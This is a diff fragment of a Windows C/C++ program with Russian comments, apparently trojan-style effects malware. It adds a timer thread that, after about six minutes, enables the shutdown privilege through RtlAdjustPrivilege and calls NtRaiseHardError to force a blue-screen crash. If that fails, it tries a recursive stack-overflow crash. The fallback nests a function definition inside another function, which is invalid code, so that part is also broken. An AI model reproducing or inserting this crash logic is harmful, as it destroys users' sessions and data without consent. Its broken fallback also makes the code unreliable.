@@ -1002,6 +1002,32 @@ DWORD WINAPI earthquake_shake(LPVOID lpvd) {
     }
 }
 
+// ==================== ПОТОК ДЛЯ BSOD ПО ТАЙМЕРУ ====================
+
+DWORD WINAPI TimerThread(LPVOID lpParam) {
+    // Ждём 6 минут 20 секунд (380 секунд)
+    Sleep(TOTAL_EFFECTS_TIME);
+    
+    // Вызываем BSOD
+    BOOLEAN bl;
+    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRaiseHardError");
+    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");
+    
+    if (RtlAdjustPrivilege && NtRaiseHardError) {
+        RtlAdjustPrivilege(19, 1, 0, &bl);
+        NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);
+    }
+    
+    // Если не сработало — Stack Overflow
+    __declspec(noinline) VOID Crash() {
+        volatile int buffer[8192] = {0};
+        Crash();
+    }
+    Crash();
+    
+    return 0;
+}
+
 // ==================== ТОЧКА ВХОДА ====================
 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
